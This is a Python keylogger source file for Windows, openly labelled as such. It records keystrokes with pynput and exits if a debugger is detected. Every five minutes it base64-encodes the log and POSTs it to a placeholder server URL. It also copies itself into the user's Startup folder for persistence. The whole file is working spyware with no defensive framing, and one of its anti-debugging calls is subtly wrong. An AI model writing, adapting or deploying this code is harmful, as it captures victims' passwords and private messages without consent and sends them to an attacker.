import pynput.keyboard
import base64
import requests
import threading
import ctypes
import os
import shutil
import getpass

# Anti-Debugging: Check if the script is being debugged to evade debugging attempts.
kernel32 = ctypes.windll.kernel32
user32 = ctypes.windll.user32
is_debugged = False

if kernel32.IsDebuggerPresent() or user32.IsDebuggerPresent():
    is_debugged = True

if is_debugged:
    exit()

# Code Splitting: Keylogger code is split into multiple functions for obfuscation.
log = ""

def process_keypress(key):
    global log
    try:
        log += str(key.char)
    except AttributeError:
        if key == key.space:
            log += " "
        else:
            log += " " + str(key) + " "

    # Data Compression: Periodically compress the log file to save disk space.

def send_logs(server_url, logs):
    encoded_logs = encrypt(logs)
    payload = {"logs": encoded_logs}
    response = requests.post(server_url, data=payload)
    if response.status_code != 200:
        print("Error sending logs to the server")

def report():
    global log
    # Send the logs to the server
    send_logs("http://your-server-url.com", log)
    log = ""
    timer = threading.Timer(300, report)
    timer.start()

def encrypt(data):
    # String Encryption: Encrypt sensitive data for confidentiality.
    encoded_data = base64.b64encode(data.encode("utf-8"))
    return encoded_data.decode("utf-8")

def add_to_startup():
    script_path = os.path.abspath(__file__)
    startup_folder = f"C:\\Users\\{getpass.getuser()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
    shutil.copy2(script_path, startup_folder)

keyboard_listener = pynput.keyboard.Listener(on_press=process_keypress)
with keyboard_listener:
    report()
    keyboard_listener.join()

# Persistence: Add the keylogger to the user's startup folder.
add_to_startup()
